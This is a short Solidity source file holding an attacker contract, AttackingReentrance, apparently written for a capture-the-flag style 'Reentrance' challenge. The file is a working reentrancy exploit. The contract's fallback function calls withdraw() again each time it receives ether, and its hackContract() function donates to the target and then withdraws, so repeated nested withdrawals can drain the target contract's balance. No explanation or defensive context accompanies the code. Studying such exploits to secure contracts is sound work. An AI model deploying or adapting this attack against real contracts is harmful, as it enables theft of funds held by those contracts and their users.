// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance public reentrance;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        reentrance = Reentrance(contractAddress);
    }

    fallback() external payable {
        reentrance.withdraw();
    }

    function hackContract() external {
        reentrance.donate{
            value: address(this).balance
        }(address(this));
        reentrance.withdraw();
    }
}
